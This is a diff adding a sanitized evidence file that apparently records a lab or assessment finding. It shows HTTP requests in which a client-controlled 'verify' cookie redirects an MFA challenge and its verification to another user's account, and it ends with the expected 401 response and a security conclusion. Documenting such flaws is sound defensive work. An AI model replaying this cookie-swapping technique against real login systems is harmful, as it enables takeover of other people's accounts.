@@ -1,0 +1,48 @@
+Evidence 02 — Cross-user MFA verification binding
+=================================================
+
+Purpose
+-------
+Determine whether the MFA identity is derived from trusted pending-session
+state or from a client-controlled selector.
+
+Sanitized challenge request
+---------------------------
+GET /login2 HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: verify=REDACTED_TARGET; session=REDACTED
+
+Sanitized response
+------------------
+HTTP/2 200 OK
+Content-Type: text/html
+
+The request caused an MFA challenge to be associated with the selected target.
+
+Sanitized verification request
+------------------------------
+POST /login2 HTTP/2
+Host: REDACTED-LAB-HOST
+Content-Type: application/x-www-form-urlencoded
+Cookie: verify=REDACTED_TARGET; session=REDACTED
+
+OTP: REDACTED
+mfa-code=REDACTED
+
+Observed vulnerable response
+----------------------------
+HTTP/2 302 Found
+Location: /my-account?id=REDACTED_TARGET
+Set-Cookie: session=REDACTED
+
+Expected secure response
+------------------------
+HTTP/2 401 Unauthorized
+
+Changing a client-controlled selector must not change the identity bound to the
+pending session.
+
+Security conclusion
+-------------------
+The application failed to bind the primary-authenticated identity, MFA
+challenge, verification request, and resulting session to the same user.
